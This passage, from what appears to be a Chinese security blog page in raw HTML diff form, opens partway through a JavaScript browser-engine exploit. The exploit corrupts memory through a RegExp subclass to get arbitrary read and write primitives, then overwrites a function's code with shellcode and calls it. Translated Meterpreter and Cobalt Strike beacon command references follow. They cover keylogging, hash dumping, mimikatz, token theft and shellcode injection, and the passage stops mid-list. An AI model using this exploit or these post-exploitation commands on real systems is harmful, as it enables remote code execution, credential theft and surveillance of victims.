class="keyword">this</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.page_buffer = <span class="keyword">new</span> LeakArrayBuffer();</span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.page_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="keyword">this</span>.page_buffer);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> <span class="built_in">RegExp</span>(&#123; <span class="attr">toString</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="string">'a'</span> &#125; &#125;);</span></span><br><span class="line"><span class="actionscript">    cb(<span class="literal">true</span>);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="class"><span class="keyword">class</span> <span class="title">DerivedBase</span> <span class="keyword">extends</span> <span class="title">RegExp</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">constructor</span>() &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// var array = null;</span></span></span><br><span class="line"><span class="actionscript">            <span class="keyword">super</span>(</span></span><br><span class="line"><span class="actionscript">                <span class="comment">// at this point, the 4-byte allocation for the JSRegExp `this` object</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// has just happened.</span></span></span><br><span class="line">                &#123;</span><br><span class="line">                    toString: cb</span><br><span class="line"><span class="actionscript">                &#125;, <span class="string">'g'</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// now the runtime JSRegExp constructor is called, corrupting the</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// JSArray.</span></span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">            <span class="comment">// this allocation will now directly follow the FixedArray allocation</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// made for `this.data`, which is where `array.elements` points to.</span></span></span><br><span class="line"><span class="javascript">            this_.buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x80</span>);</span></span><br><span class="line">            g_array[8] = this_.page_buffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// try&#123;</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> derived_n = eval(`(<span class="function"><span class="keyword">function</span> <span class="title">derived_n</span><span class="params">(i)</span> </span>&#123;</span></span><br><span class="line">        if (i == 0) &#123;</span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> DerivedBase;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="class"><span class="keyword">class</span> <span class="title">DerivedN</span> <span class="keyword">extends</span> <span class="title">derived_n</span>(<span class="title">i</span>-1) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">constructor</span>() &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">super</span>();</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span>;</span></span><br><span class="line"><span class="actionscript">                $&#123;<span class="string">"this.a=0;"</span>.repeat(tDerivedNCount)&#125;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> DerivedN;</span></span><br><span class="line">    &#125;)`);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">new</span> (derived_n(tDerivedNDepth))();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.buffer_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="keyword">this</span>.buffer);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.leakPtr = <span class="function"><span class="keyword">function</span> <span class="params">(obj)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.page_buffer.slot = obj;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>.buffer_view.getUint32(kSlotOffset, <span class="literal">true</span>, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.setPtr = <span class="function"><span class="keyword">function</span> <span class="params">(addr)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.buffer_view.setUint32(kBackingStoreOffset, addr, <span class="literal">true</span>, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.read32 = <span class="function"><span class="keyword">function</span> <span class="params">(addr)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.setPtr(addr);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="keyword">this</span>.page_view.getUint32(<span class="number">0</span>, <span class="literal">true</span>, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.write32 = <span class="function"><span class="keyword">function</span> <span class="params">(addr, value)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.setPtr(addr);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.page_view.setUint32(<span class="number">0</span>, value, <span class="literal">true</span>, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.write8 = <span class="function"><span class="keyword">function</span> <span class="params">(addr, value)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.setPtr(addr);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.page_view.setUint8(<span class="number">0</span>, value, ...this.prevent_opt);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">this</span>.setBytes = <span class="function"><span class="keyword">function</span> <span class="params">(addr, content)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; content.length; i++) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.write8(addr + i, content[i]);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> <span class="keyword">this</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> oob = oobAccess();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> func_ptr = oob.leakPtr(target_function);</span></span><br><span class="line"><span class="actionscript">    print(<span class="string">'[*] target_function at 0x'</span> + func_ptr.toString(<span class="number">16</span>));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> kCodeInsOffset = <span class="number">0x1b</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> code_addr = oob.read32(func_ptr + kCodeInsOffset);</span></span><br><span class="line"><span class="actionscript">    print(<span class="string">'[*] code_addr at 0x'</span> + code_addr.toString(<span class="number">16</span>));</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    oob.setBytes(code_addr, shellcode);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    target_function(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="actionscript">    print(<span class="string">"start running"</span>);</span></span><br><span class="line">    trigger();</span><br><span class="line"><span class="actionscript">&#125;<span class="keyword">catch</span>(e)&#123;</span></span><br><span class="line">    print(e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="meterpreter命令详解"><a href="#meterpreter命令详解" class="headerlink" title="meterpreter命令详解"></a>meterpreter命令详解</h2><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">    Command              Description</span></span><br><span class="line"><span class="code">    -------                   -----------</span></span><br><span class="line"><span class="code">    ?                         帮助菜单</span></span><br><span class="line"><span class="code">    background                当前会议的背景</span></span><br><span class="line"><span class="code">    bg                        背景的别称</span></span><br><span class="line"><span class="code">    bgkill                    杀死一个后台计价器脚本</span></span><br><span class="line"><span class="code">    bglist                    列出正在运行的后台脚本</span></span><br><span class="line"><span class="code">    bgrun                     以后台线程的形式执行抄表器脚本</span></span><br><span class="line"><span class="code">    channel                   显示信息或控制活动通道</span></span><br><span class="line"><span class="code">    close                     关闭通道</span></span><br><span class="line"><span class="code">    disable_unicode_encoding  禁用unicode字符串的编码。</span></span><br><span class="line"><span class="code">    enable_unicode_encoding   启用unicode字符串的编码。</span></span><br><span class="line"><span class="code">    exit                      终止流量计会话</span></span><br><span class="line"><span class="code">    get_timeouts              获取当前会话超时值</span></span><br><span class="line"><span class="code">    guid                      获取会话GUID</span></span><br><span class="line"><span class="code">    help                      帮助菜单</span></span><br><span class="line"><span class="code">    info                      显示邮政模块的信息</span></span><br><span class="line"><span class="code">    irb                       在当前会话上打开一个交互式Ruby shell</span></span><br><span class="line"><span class="code">    load                      装入一个或多个表前仪分机</span></span><br><span class="line"><span class="code">    machine_id                获取连接到会话的机器的MSF ID。</span></span><br><span class="line"><span class="code">    migrate                   将服务器迁移到另一个进程</span></span><br><span class="line"><span class="code">    pivot                     管理中枢监听器</span></span><br><span class="line"><span class="code">    pry                       在当前会话上打开Pry调试器。</span></span><br><span class="line"><span class="code">    quit                      终止流量计会话</span></span><br><span class="line"><span class="code">    read                      从通道中读取数据</span></span><br><span class="line"><span class="code">    resource                  运行存储在文件中的命令</span></span><br><span class="line"><span class="code">    run                       执行一个抄表器脚本或Post模块。</span></span><br><span class="line"><span class="code">    secure                    (重)在会话上协商TLV数据包加密问题</span></span><br><span class="line"><span class="code">    sessions                  快速切换到另一个会话</span></span><br><span class="line"><span class="code">    set_timeouts              设置当前会话超时值</span></span><br><span class="line"><span class="code">    sleep                     迫使Meterpreter安静下来，然后重新建立会话。</span></span><br><span class="line"><span class="code">    transport                 改变当前的传输机制</span></span><br><span class="line"><span class="code">    use                       "load "的弃用别名</span></span><br><span class="line"><span class="code">    uuid                      获取当前会话的UUID</span></span><br><span class="line"><span class="code">    write                     将数据写入通道</span></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    cat           将文件内容读到屏幕上</span></span><br><span class="line"><span class="code">    cd            更改目录</span></span><br><span class="line"><span class="code">    checksum      检索文件的校验和</span></span><br><span class="line"><span class="code">    cp            将源头复制到目的地</span></span><br><span class="line"><span class="code">    dir           列表文件（ls的别名</span></span><br><span class="line"><span class="code">    download      下载文件或目录</span></span><br><span class="line"><span class="code">    edit          编辑文件</span></span><br><span class="line"><span class="code">    getlwd        打印本地工作目录</span></span><br><span class="line"><span class="code">    getwd         打印工作目录</span></span><br><span class="line"><span class="code">    lcd           更改本地工作目录</span></span><br><span class="line"><span class="code">    lls           列出本地文件</span></span><br><span class="line"><span class="code">    lpwd          打印本地工作目录</span></span><br><span class="line"><span class="code">    ls            列表文件</span></span><br><span class="line"><span class="code">    mkdir         制作目录</span></span><br><span class="line"><span class="code">    mv            将源头移动到目的地</span></span><br><span class="line"><span class="code">    pwd           打印工作目录</span></span><br><span class="line"><span class="code">    rm            删除指定的文件</span></span><br><span class="line"><span class="code">    rmdir         删除目录</span></span><br><span class="line"><span class="code">    search        搜索文件</span></span><br><span class="line"><span class="code">    show_mount    列出所有挂载点/逻辑驱动器</span></span><br><span class="line"><span class="code">    upload        上传文件或目录</span></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    arp           显示主机ARP缓存</span></span><br><span class="line"><span class="code">    getproxy      显示当前的代理配置</span></span><br><span class="line"><span class="code">    ifconfig      显示界面</span></span><br><span class="line"><span class="code">    ipconfig      显示界面</span></span><br><span class="line"><span class="code">    netstat       显示网络连接</span></span><br><span class="line"><span class="code">    portfwd       将本地端口转发给远程服务</span></span><br><span class="line"><span class="code">    resolve       在目标机上解析一组主机名。</span></span><br><span class="line"><span class="code">    route         查看和修改路由表</span></span><br><span class="line">Stdapi: System Commands</span><br><span class="line">=======================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    clearev       清除事件日志</span></span><br><span class="line"><span class="code">    drop_token    放弃任何活动的冒充令牌。</span></span><br><span class="line"><span class="code">    execute       执行一个命令</span></span><br><span class="line"><span class="code">    getenv        获取一个或多个环境变量值</span></span><br><span class="line"><span class="code">    getpid        获取当前进程标识符</span></span><br><span class="line"><span class="code">    getprivs      试图启用当前进程的所有可用特权</span></span><br><span class="line"><span class="code">    getsid        获取服务器正在运行的用户的SID为</span></span><br><span class="line"><span class="code">    getuid        获取服务器运行的用户为</span></span><br><span class="line"><span class="code">    kill          终止一个进程</span></span><br><span class="line"><span class="code">    localtime     显示目标系统的本地日期和时间。</span></span><br><span class="line"><span class="code">    pgrep         按名称过滤进程</span></span><br><span class="line"><span class="code">    pkill         按名称终止进程</span></span><br><span class="line"><span class="code">    ps            列出正在运行的进程</span></span><br><span class="line"><span class="code">    reboot        重新启动远程计算机</span></span><br><span class="line"><span class="code">    reg           修改远程注册表并与之互动</span></span><br><span class="line"><span class="code">    rev2self      在远程机器上调用RevertToSelf()。</span></span><br><span class="line"><span class="code">    shell         进入系统命令行</span></span><br><span class="line"><span class="code">    shutdown      关闭远程电脑</span></span><br><span class="line"><span class="code">    steal_token   试图从目标进程中窃取冒充令牌</span></span><br><span class="line"><span class="code">    suspend       暂停或恢复进程清单。</span></span><br><span class="line"><span class="code">    sysinfo       获取远程系统的信息，如操作系统。</span></span><br><span class="line">Stdapi: User interface Commands</span><br><span class="line">===============================</span><br><span class="line"><span class="code">    Command        Description</span></span><br><span class="line"><span class="code">    -------        -----------</span></span><br><span class="line"><span class="code">    enumdesktops   列出所有可访问的桌面和窗口站</span></span><br><span class="line"><span class="code">    getdesktop     获取当前的仪表盘桌面</span></span><br><span class="line"><span class="code">    idletime       返回远程用户闲置的秒数。</span></span><br><span class="line"><span class="code">    keyboard_send  发送按键</span></span><br><span class="line"><span class="code">    keyevent       发送关键事件</span></span><br><span class="line"><span class="code">    keyscan_dump   转储按键缓冲区</span></span><br><span class="line"><span class="code">    keyscan_start  开始捕捉按键</span></span><br><span class="line"><span class="code">    keyscan_stop   停止捕捉按键</span></span><br><span class="line"><span class="code">    mouse          发送鼠标事件</span></span><br><span class="line"><span class="code">    screenshare    实时观看远程用户的桌面。</span></span><br><span class="line"><span class="code">    screenshot     抓取交互式桌面的截图</span></span><br><span class="line"><span class="code">    setdesktop     更改当前桌面的计价器</span></span><br><span class="line"><span class="code">    uictl          控制一些用户界面组件</span></span><br><span class="line">Stdapi: Webcam Commands</span><br><span class="line">=======================</span><br><span class="line"><span class="code">    Command        Description</span></span><br><span class="line"><span class="code">    -------        -----------</span></span><br><span class="line"><span class="code">    record_mic     用默认麦克风录制音频X秒。</span></span><br><span class="line"><span class="code">    webcam_chat    开始视频聊天</span></span><br><span class="line"><span class="code">    webcam_list    网络摄像机列表</span></span><br><span class="line"><span class="code">    webcam_snap    从指定的网络摄像头拍摄快照</span></span><br><span class="line"><span class="code">    webcam_stream  播放指定网络摄像头的视频流</span></span><br><span class="line">Stdapi: Audio Output Commands</span><br><span class="line">=============================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    play          在目标系统上播放音频文件，没有任何内容写入磁盘</span></span><br><span class="line">Priv: Elevate Commands</span><br><span class="line">======================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    getsystem     试图将你的权限提升到本地系统的权限。</span></span><br><span class="line">Priv: Password database Commands</span><br><span class="line">================================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    hashdump      转储SAM数据库的内容</span></span><br><span class="line">Priv: Timestomp Commands</span><br><span class="line">========================</span><br><span class="line"><span class="code">    Command       Description</span></span><br><span class="line"><span class="code">    -------       -----------</span></span><br><span class="line"><span class="code">    timestomp     操作文件的MACE属性</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Cobaltstrike-beacon详解"><a href="#Cobaltstrike-beacon详解" class="headerlink" title="Cobaltstrike beacon详解"></a>Cobaltstrike beacon详解</h2><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">命令</span>                              <span class="string">描述</span></span><br><span class="line"><span class="meta">-------</span>                          <span class="string">--------</span></span><br><span class="line"><span class="attr">argue</span>                            <span class="string">匹配过程的虚假参数</span></span><br><span class="line"><span class="attr">blockdlls</span>                        <span class="string">阻止子进程中的非微软DLLs</span></span><br><span class="line"><span class="attr">browserpivot</span>                     <span class="string">设置浏览器pivot会话</span></span><br><span class="line"><span class="attr">cancel</span>                           <span class="string">取消正在进行的下载</span></span><br><span class="line"><span class="attr">cd</span>                               <span class="string">更改目录</span></span><br><span class="line"><span class="attr">checkin</span>                          <span class="string">Call home and post data</span></span><br><span class="line"><span class="attr">chromedump</span>                       <span class="string">恢复谷歌浏览器的证书</span></span><br><span class="line"><span class="attr">clear</span>                            <span class="string">清除信标队列</span></span><br><span class="line"><span class="attr">connect</span>                          <span class="string">通过TCP连接到一个Beacon对等体</span></span><br><span class="line"><span class="attr">covertvpn</span>                        <span class="string">部署Covert VPN客户端</span></span><br><span class="line"><span class="attr">cp</span>                               <span class="string">复制文件</span></span><br><span class="line"><span class="attr">dcsync</span>                           <span class="string">从DC中提取密码哈希值</span></span><br><span class="line"><span class="attr">desktop</span>                          <span class="string">查看目标的桌面并与之互动</span></span><br><span class="line"><span class="attr">dllinject</span>                        <span class="string">在进程中注入Reflective DLL。</span></span><br><span class="line"><span class="attr">dllload</span>                          <span class="string">用LoadLibrary()将DLL加载到一个进程中。</span></span><br><span class="line"><span class="attr">download</span>                         <span class="string">下载文件</span></span><br><span class="line"><span class="attr">downloads</span>                        <span class="string">列出正在进行的文件下载</span></span><br><span class="line"><span class="attr">drives</span>                           <span class="string">在目标上列出驱动器</span></span><br><span class="line"><span class="attr">elevate</span>                          <span class="string">在升高的上下文中生成一个会话</span></span><br><span class="line"><span class="attr">execute</span>                          <span class="string">在目标机上执行程序(无输出)</span></span><br><span class="line"><span class="attr">executeassembly</span>                  <span class="string">在目标机上执行本地.NET程序。</span></span><br><span class="line"><span class="attr">exit</span>                             <span class="string">终止信标会话</span></span><br><span class="line"><span class="attr">getprivs</span>                         <span class="string">启用当前令牌的系统权限</span></span><br><span class="line"><span class="attr">getsystem</span>                        <span class="string">试图获得系统</span></span><br><span class="line"><span class="attr">getuid</span>                           <span class="string">获取用户ID</span></span><br><span class="line"><span class="attr">hashdump</span>                         <span class="string">转储密码哈希</span></span><br><span class="line"><span class="attr">help</span>                             <span class="string">帮助菜单</span></span><br><span class="line"><span class="attr">inject</span>                           <span class="string">在特定的进程中产生一个会话</span></span><br><span class="line"><span class="attr">inlineexecute</span>                    <span class="string">在此环节中运行一个信标对象文件</span></span><br><span class="line"><span class="attr">jobkill</span>                          <span class="string">杀死一个长期存在的后期开发任务。</span></span><br><span class="line"><span class="attr">jobs</span>                             <span class="string">列出长期运行的开发后任务（List long-running post-exploitation tasks）</span></span><br><span class="line"><span class="attr">jump</span>                             <span class="string">在远程主机上生成一个会话</span></span><br><span class="line"><span class="attr">kerberos_ccache_use</span>              <span class="string">将缓存中的 kerberos ticket 应用到这个会话中。</span></span><br><span class="line"><span class="attr">kerberos_ticket_purge</span>            <span class="string">清除本次会话中的kerberos票据</span></span><br><span class="line"><span class="attr">kerberos_ticket_use</span>              <span class="string">将 kerberos ticket 应用到这个会话</span></span><br><span class="line"><span class="attr">keylogger</span>                        <span class="string">启动击键记录器</span></span><br><span class="line"><span class="attr">kill</span>                             <span class="string">杀死一个进程</span></span><br><span class="line"><span class="attr">link</span>                             <span class="string">通过命名的管道连接到Beacon对等体</span></span><br><span class="line"><span class="attr">logonpasswords</span>                   <span class="string">用mimikatz转储证书和哈希值。</span></span><br><span class="line"><span class="attr">ls</span>                               <span class="string">列表文件</span></span><br><span class="line"><span class="attr">make_token</span>                       <span class="string">创建一个传递凭证的令牌</span></span><br><span class="line"><span class="attr">mimikatz</span>                         <span class="string">运行mimikatz命令</span></span><br><span class="line"><span class="attr">mkdir</span>                            <span class="string">建立一个目录</span></span><br><span class="line"><span class="attr">mode</span>                             <span class="string">dns 使用DNS A作为数据通道(仅限DNS信标)</span></span><br><span class="line"><span class="attr">mode</span>                             <span class="string">dnstxt 使用DNS TXT作为数据通道(仅限DNS信标)</span></span><br><span class="line"><span class="attr">mode</span>                             <span class="string">dns6 使用 DNS AAAA 作为数据通道（仅适用于 DNS 信标）。</span></span><br><span class="line"><span class="attr">mv</span>                               <span class="string">移动文件</span></span><br><span class="line"><span class="attr">net</span>                              <span class="string">网络和主机枚举工具</span></span><br><span class="line"><span class="attr">note</span>                             <span class="string">为该信标指定一个注释</span></span><br><span class="line"><span class="attr">portscan</span>                         <span class="string">扫描网络中的开放服务</span></span><br><span class="line"><span class="attr">powerpick</span>                        <span class="string">通过Unmanaged PowerShell执行命令。</span></span><br><span class="line"><span class="attr">powershell</span>                       <span class="string">通过powershell.exe执行命令。</span></span><br><span class="line"><span class="attr">powershellimport</span>                 <span class="string">导入一个powershell脚本</span></span><br><span class="line"><span class="attr">ppid</span>                             <span class="string">为生成的postex作业设置父级PID。</span></span><br><span class="line"><span class="attr">printscreen</span>                      <span class="string">通过PrintScr方法拍摄一张截图</span></span><br><span class="line"><span class="attr">ps</span>                               <span class="string">显示过程列表</span></span><br><span class="line"><span class="attr">psinject</span>                         <span class="string">在特定进程中执行PowerShell命令</span></span><br><span class="line"><span class="attr">pth</span>                              <span class="string">使用Mimikatz的Passthehash。</span></span><br><span class="line"><span class="attr">pwd</span>                              <span class="string">打印当前目录</span></span><br><span class="line"><span class="attr">reg</span>                              <span class="string">查询注册表</span></span><br><span class="line"><span class="attr">remoteexec</span>                       <span class="string">在远程主机上运行一个命令</span></span><br><span class="line"><span class="attr">rev2self</span>                         <span class="string">恢复到原来的令牌</span></span><br><span class="line"><span class="attr">rm</span>                               <span class="string">移除文件或文件夹</span></span><br><span class="line"><span class="attr">rportfwd</span>                         <span class="string">设置逆向端口转发</span></span><br><span class="line"><span class="attr">rportfwd_local</span>                   <span class="string">通过Cobalt Strike客户端设置反向端口转发。</span></span><br><span class="line"><span class="attr">run</span>                              <span class="string">在目标机上执行程序(返回输出)</span></span><br><span class="line"><span class="attr">runas</span>                            <span class="string">以其他用户身份执行程序</span></span><br><span class="line"><span class="attr">runasadmin</span>                       <span class="string">在提高的上下文中执行程序（ Execute a program in an elevated context）</span></span><br><span class="line"><span class="attr">runu</span>                             <span class="string">在另一个PID下执行程序</span></span><br><span class="line"><span class="attr">screenshot</span>                       <span class="string">拍一张截图</span></span><br><span class="line"><span class="attr">screenwatch</span>                      <span class="string">定期对桌面进行截屏</span></span><br><span class="line"><span class="attr">setenv</span>                           <span class="string">设置一个环境变量</span></span><br><span class="line"><span class="attr">shell</span>                            <span class="string">通过cmd.exe执行命令。</span></span><br><span class="line"><span class="attr">shinject</span>                         <span class="string">将shellcode注入到进程中</span></span><br><span class="line"><span class="attr">shspawn</span>                          <span class="string">生成进程并将shellcode注入其中</span></span><br><span class="line"><span class="attr">sleep</span>                            <span 